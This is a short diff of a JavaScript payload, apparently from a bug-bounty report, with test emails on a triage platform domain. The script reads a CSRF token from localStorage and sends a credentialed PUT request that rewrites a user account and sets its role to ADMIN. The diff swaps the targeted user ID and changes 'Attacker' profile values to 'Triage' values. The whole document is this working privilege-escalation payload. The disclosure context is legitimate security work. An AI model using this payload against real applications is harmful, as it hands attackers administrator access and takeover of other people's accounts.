@@ -1,7 +1,7 @@
 (()=>{
     const csrf = localStorage.getItem('csrfToken');
     
-    fetch('/web/api2/v3/users/LcKS61MC72mHsqNCQtDXZ7', {
+    fetch('/web/api2/v3/users/bFDIRISwpgbi7BfvMydhu0', {
         method: 'PUT',
         credentials: 'include',
         headers: {
@@ -9,10 +9,10 @@
             'X-Csrf-Token': csrf
         },
         body: JSON.stringify({
-            firstName: "Attacker",
-            lastName: "cathack",
-            email: "aydilfhr+user1@intigriti.me",
-            userName: "aydilfhr+user1",
+            firstName: "User",
+            lastName: "Triage",
+            email: "aydilfhr+1@intigriti.me",
+            userName: "aydilfhr",
             role: "ADMIN",
             timezone: "Europe/London",
             active: true,
